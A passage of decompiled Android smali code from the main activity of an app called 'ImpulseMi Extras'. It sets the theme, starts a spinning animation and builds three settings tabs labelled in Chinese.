    invoke-static {v0, v1, v2}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v0

    const/16 v1, 0x231

    if-eq v0, v1, :cond_1

    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->a()V

    goto :goto_0

    :cond_1
    sput-boolean v3, Lcom/impulsemi/extras/MainActivity;->g:Z

    :goto_0
    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->d()V

    invoke-virtual {p0}, Lcom/impulsemi/extras/MainActivity;->b()V

    .line 1
    :goto_1
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v0

    iget v0, v0, Landroid/content/res/Configuration;->uiMode:I

    and-int/lit8 v0, v0, 0x30

    const/16 v1, 0x20

    if-ne v0, v1, :cond_2

    const/4 v2, 0x1

    :cond_2
    if-eqz v2, :cond_3

    .line 2
    sget v0, Lc/f;->Theme_Dark_Settings:I

    goto :goto_2

    :cond_3
    sget v0, Lc/f;->Theme_Light_Settings:I

    :goto_2
    invoke-virtual {p0, v0}, Landroid/app/Activity;->setTheme(I)V

    invoke-super {p0, p1}, Lc/h/b;->onCreate(Landroid/os/Bundle;)V

    const-string p1, "ImpulseMi Extras"

    invoke-virtual {p0, p1}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V

    const p1, 0x7f0800ba

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    const/4 v0, 0x2

    new-array v1, v0, [F

    fill-array-data v1, :array_0

    const-string v2, "rotation"

    invoke-static {p1, v2, v1}, Landroid/animation/ObjectAnimator;->ofFloat(Ljava/lang/Object;Ljava/lang/String;[F)Landroid/animation/ObjectAnimator;

    move-result-object p1

    const v1, 0x98967f

    invoke-virtual {p1, v1}, Landroid/animation/ObjectAnimator;->setRepeatCount(I)V

    invoke-virtual {p1}, Landroid/animation/ObjectAnimator;->start()V

    invoke-virtual {p0}, Lc/h/b;->getActionBar()Lc/h/a;

    move-result-object p1

    invoke-virtual {p0}, Landroid/app/Activity;->getFragmentManager()Landroid/app/FragmentManager;

    move-result-object v1

    move-object v2, p1

    check-cast v2, Lb/c/a/l/b;

    .line 3
    invoke-virtual {v2}, Lb/c/a/l/b;->a()Z

    move-result v4

    if-eqz v4, :cond_4

    goto :goto_3

    :cond_4
    invoke-virtual {v2}, Lb/c/a/l/b;->removeAllTabs()V

    invoke-virtual {v2, v0}, Lb/c/a/l/b;->setNavigationMode(I)V

    new-instance v0, Lb/c/a/l/d;

    invoke-direct {v0, v2, v1, v3}, Lb/c/a/l/d;-><init>(Lb/c/a/l/b;Landroid/app/FragmentManager;Z)V

    iput-object v0, v2, Lb/c/a/l/b;->m:Lb/c/a/l/d;

    iget-object v1, v2, Lb/c/a/l/b;->j:Lb/c/a/p/k;

    .line 4
    iget-object v4, v0, Lb/c/a/l/d;->b:Ljava/util/ArrayList;

    if-nez v4, :cond_5

    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    iput-object v4, v0, Lb/c/a/l/d;->b:Ljava/util/ArrayList;

    :cond_5
    iget-object v0, v0, Lb/c/a/l/d;->b:Ljava/util/ArrayList;

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 5
    iget-object v0, v2, Lb/c/a/l/b;->C:Lb/c/a/p/b;

    .line 6
    iget-object v1, v2, Lb/c/a/l/b;->m:Lb/c/a/l/d;

    .line 7
    iget-object v4, v1, Lb/c/a/l/d;->b:Ljava/util/ArrayList;

    if-nez v4, :cond_6

    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    iput-object v4, v1, Lb/c/a/l/d;->b:Ljava/util/ArrayList;

    :cond_6
    iget-object v1, v1, Lb/c/a/l/d;->b:Ljava/util/ArrayList;

    invoke-virtual {v1, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 8
    iget-object v0, v2, Lb/c/a/l/b;->C:Lb/c/a/p/b;

    invoke-virtual {v0, v3}, Lb/c/a/p/b;->setFragmentViewPagerMode(Z)V

    .line 9
    :goto_3
    sget-object v5, Lcom/impulsemi/extras/MainActivity;->c:Ljava/lang/String;

    invoke-virtual {p1}, Landroid/app/ActionBar;->newTab()Landroid/app/ActionBar$Tab;

    move-result-object v0

    const-string v1, "\u5e38\u7528"

    invoke-virtual {v0, v1}, Landroid/app/ActionBar$Tab;->setText(Ljava/lang/CharSequence;)Landroid/app/ActionBar$Tab;

    move-result-object v6

    const-class v7, Lb/b/a/c;

    const/4 v8, 0x0

    const/4 v9, 0x0

    move-object v4, p1

    invoke-virtual/range {v4 .. v9}, Lc/h/a;->a(Ljava/lang/String;Landroid/app/ActionBar$Tab;Ljava/lang/Class;Landroid/os/Bundle;Z)I

    sget-object v5, Lcom/impulsemi/extras/MainActivity;->d:Ljava/lang/String;

    invoke-virtual {p1}, Landroid/app/ActionBar;->newTab()Landroid/app/ActionBar$Tab;

    move-result-object v0

    const-string v1, "\u72b6\u6001\u680f"

    invoke-virtual {v0, v1}, Landroid/app/ActionBar$Tab;->setText(Ljava/lang/CharSequence;)Landroid/app/ActionBar$Tab;

    move-result-object v6

    const-class v7, Lb/b/a/m;

    invoke-virtual/range {v4 .. v9}, Lc/h/a;->a(Ljava/lang/String;Landroid/app/ActionBar$Tab;Ljava/lang/Class;Landroid/os/Bundle;Z)I

    sget-object v5, Lcom/impulsemi/extras/MainActivity;->e:Ljava/lang/String;

    invoke-virtual {p1}, Landroid/app/ActionBar;->newTab()Landroid/app/ActionBar$Tab;

    move-result-object v0

    const-string v1, "\u5173\u4e8e"

    invoke-virtual {v0, v1}, Landroid/app/ActionBar$Tab;->setText(Ljava/lang/CharSequence;)Landroid/app/ActionBar$Tab;

    move-result-object v6

    const-class v7, Lb/b/a/a;

    invoke-virtual/range {v4 .. v9}, Lc/h/a;->a(Ljava/lang/String;Landroid/app/ActionBar$Tab;Ljava/lang/Class;Landroid/os/Bundle;Z)I

    return-void

    :array_0
    .array-data 4
        0x0
        0x43b40000    # 360.0f
    .end array-data
.end method
